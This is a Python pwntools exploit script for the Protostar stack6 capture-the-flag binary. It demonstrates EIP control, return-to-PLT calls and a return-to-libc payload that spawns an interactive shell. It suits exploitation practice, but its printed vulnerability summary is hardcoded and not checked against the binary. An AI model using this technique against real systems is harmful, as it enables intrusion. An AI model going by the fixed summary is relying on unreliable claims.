#!/usr/bin/env python3
"""
Stack6 Complete Exploit PoC
===========================

This script demonstrates multiple exploitation techniques for the stack6 binary:
1. EIP control demonstration  
2. Return-to-libc shell exploit
3. Return-to-PLT techniques
4. Buffer overflow analysis

Vulnerability: Buffer overflow in gets() with return address protection bypass
Target: Protostar stack6 challenge
Author: AI Assistant
"""

from pwn import *
import sys
import time

# Global configuration
context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

BINARY_PATH = './binaries/stack6'
LIBC_PATH = '/lib32/libc.so.6'

class Stack6Exploit:
    def __init__(self):
        self.elf = ELF(BINARY_PATH)
        self.libc = ELF(LIBC_PATH)
        self.offset = 80  # 76 bytes buffer + 4 bytes saved EBP
        
    def get_libc_base(self):
        """Get libc base address from process memory"""
        p = process(BINARY_PATH)
        pid = p.pid
        
        with open(f'/proc/{pid}/maps', 'r') as f:
            maps = f.read()
        
        libc_base = None
        for line in maps.split('\n'):
            if 'libc-' in line or 'libc.so' in line:
                libc_base = int(line.split('-')[0], 16)
                break
        
        p.close()
        return libc_base
    
    def demo_eip_control(self):
        """Demonstrate complete EIP control"""
        log.info("=== EIP Control Demonstration ===")
        log.info("Sending payload to crash with controlled EIP...")
        
        # Payload to control EIP with 0x41414141
        payload = b'A' * 76
        payload += b'BBBB'  # Saved EBP
        payload += p32(0x41414141)  # Controlled EIP
        
        log.info(f"Buffer: 'A' * 76")
        log.info(f"Saved EBP: 'BBBB' (0x42424242)")
        log.info(f"Return Address: 0x41414141")
        log.info(f"Total payload size: {len(payload)} bytes")
        
        p = process(BINARY_PATH)
        p.sendline(payload)
        p.wait()
        
        log.success("✅ EIP successfully controlled!")
        log.info("Expected crash: EIP = 0x41414141, EBP = 0x42424242")
        
    def demo_ret2main(self):
        """Demonstrate return-to-main infinite loop"""
        log.info("=== Return-to-main Demonstration ===")
        
        main_addr = self.elf.symbols['main']
        log.info(f"main() address: {hex(main_addr)}")
        
        payload = b'A' * self.offset
        payload += p32(main_addr)
        
        log.info("Sending payload to return to main()...")
        
        p = process(BINARY_PATH)
        p.sendline(payload)
        
        # Should see the prompt again
        try:
            output = p.recv(timeout=2)
            if b'input path please:' in output:
                log.success("✅ Successfully returned to main() - infinite loop created!")
                log.info("Program restarted and is asking for input again")
            else:
                log.warning("Unexpected output")
        except:
            log.error("Failed to receive output")
        
        p.close()
        
    def demo_ret2plt(self):
        """Demonstrate return-to-PLT attack"""
        log.info("=== Return-to-PLT Demonstration ===")
        
        printf_plt = self.elf.plt['printf']
        exit_plt = self.elf.plt['_exit']
        fmt_string = 0x80485f0  # "got path %s\n"
        
        log.info(f"printf@plt: {hex(printf_plt)}")
        log.info(f"_exit@plt: {hex(exit_plt)}")
        log.info(f"Format string: {hex(fmt_string)}")
        
        # Call printf with controlled arguments
        payload = b'A' * self.offset
        payload += p32(printf_plt)    # Call printf
        payload += p32(exit_plt)      # Return to exit
        payload += p32(fmt_string)    # Format string arg
        payload += p32(0x13371337)    # Data to print
        
        log.info("Calling printf() with controlled arguments...")
        
        p = process(BINARY_PATH)
        p.sendline(payload)
        
        try:
            output = p.recvall(timeout=2)
            log.success("✅ Return-to-PLT successful!")
            log.info(f"Printf output: {output}")
        except:
            log.warning("Could not capture PLT output")
        
        p.close()
        
    def exploit_shell(self):
        """Full return-to-libc shell exploit"""
        log.info("=== Return-to-libc Shell Exploit ===")
        
        # Get libc base
        libc_base = self.get_libc_base()
        if not libc_base:
            log.error("Could not find libc base address")
            return False
        
        log.info(f"libc base: {hex(libc_base)}")
        
        # Calculate addresses
        system_addr = libc_base + self.libc.symbols['system']
        exit_addr = libc_base + self.libc.symbols['exit']
        binsh_addr = libc_base + next(self.libc.search(b'/bin/sh'))
        
        log.info(f"system(): {hex(system_addr)}")
        log.info(f"exit(): {hex(exit_addr)}")
        log.info(f"/bin/sh: {hex(binsh_addr)}")
        
        # Build payload: system("/bin/sh")
        payload = b'A' * self.offset
        payload += p32(system_addr)   # Return to system()
        payload += p32(exit_addr)     # Return from system() to exit()
        payload += p32(binsh_addr)    # Argument: "/bin/sh"
        
        log.info(f"Payload size: {len(payload)} bytes")
        
        # Launch exploit
        log.info("🚀 Launching shell exploit...")
        p = process(BINARY_PATH)
        p.sendline(payload)
        
        # Wait for shell
        time.sleep(0.5)
        
        # Test shell with 'id' command
        p.sendline(b'id')
        
        try:
            output = p.recvline(timeout=3)
            if b'uid=' in output:
                log.success("🎉 SHELL SPAWNED SUCCESSFULLY!")
                log.info(f"Shell output: {output.decode().strip()}")
                log.info("You now have a shell! Type commands or 'exit' to quit.")
                p.interactive()
                return True
            else:
                log.warning("Shell may not have spawned correctly")
                
        except EOFError:
            log.warning("Shell spawned but exited quickly")
        except:
            log.error("Failed to interact with shell")
        
        p.close()
        return False
        
    def analyze_binary(self):
        """Analyze the binary for vulnerabilities"""
        log.info("=== Binary Analysis ===")
        
        log.info(f"Binary: {BINARY_PATH}")
        log.info(f"Architecture: {self.elf.arch}")
        log.info(f"Entry point: {hex(self.elf.entry)}")
        
        # Security features
        log.info("Security Features:")
        log.info(f"  RELRO: {'Enabled' if self.elf.relro else 'Disabled'}")
        log.info(f"  Stack Canary: {'Enabled' if self.elf.canary else 'Disabled'}")
        log.info(f"  NX: {'Enabled' if self.elf.nx else 'Disabled'}")
        log.info(f"  PIE: {'Enabled' if self.elf.pie else 'Disabled'}")
        
        # Key functions
        log.info("Key Functions:")
        log.info(f"  main: {hex(self.elf.symbols['main'])}")
        log.info(f"  getpath: {hex(self.elf.symbols.get('getpath', 0))}")
        
        # PLT entries
        log.info("PLT Entries:")
        for func in ['gets', 'printf', '_exit']:
            if func in self.elf.plt:
                log.info(f"  {func}@plt: {hex(self.elf.plt[func])}")
        
        # Vulnerability summary
        log.info("\n🔍 Vulnerability Analysis:")
        log.info("  - Buffer overflow in gets() function")
        log.info("  - No stack canaries -> Easy overflow")
        log.info("  - Return address protection (blocks stack addresses)")
        log.info("  - Executable stack (allows shellcode if protection bypassed)")
        log.info("  - No ASLR -> Predictable addresses")
        log.info("  ✅ Exploitable via return-to-libc")

def main():
    """Main exploit menu"""
    exploit = Stack6Exploit()
    
    if len(sys.argv) > 1:
        mode = sys.argv[1].lower()
        
        if mode == 'analyze':
            exploit.analyze_binary()
        elif mode == 'eip':
            exploit.demo_eip_control()
        elif mode == 'main':
            exploit.demo_ret2main()
        elif mode == 'plt':
            exploit.demo_ret2plt()
        elif mode == 'shell':
            exploit.exploit_shell()
        elif mode == 'all':
            exploit.analyze_binary()
            print()
            exploit.demo_eip_control()
            print()
            exploit.demo_ret2main()
            print()
            exploit.demo_ret2plt()
            print()
            exploit.exploit_shell()
        else:
            print("Invalid mode. Use: analyze, eip, main, plt, shell, or all")
    else:
        print("")
        print("🎯 Stack6 Complete Exploit PoC")
        print("==============================")
        print("")
        print("Available modes:")
        print("  analyze - Analyze binary for vulnerabilities")
        print("  eip     - Demonstrate EIP control")
        print("  main    - Return-to-main demonstration")
        print("  plt     - Return-to-PLT attack")
        print("  shell   - Return-to-libc shell exploit")
        print("  all     - Run all demonstrations")
        print("")
        print("Usage: python3 stack6_complete.py [mode]")
        print("Example: python3 stack6_complete.py shell")
        print("")
        
        # Run analysis by default
        exploit.analyze_binary()

if __name__ == '__main__':
    main()

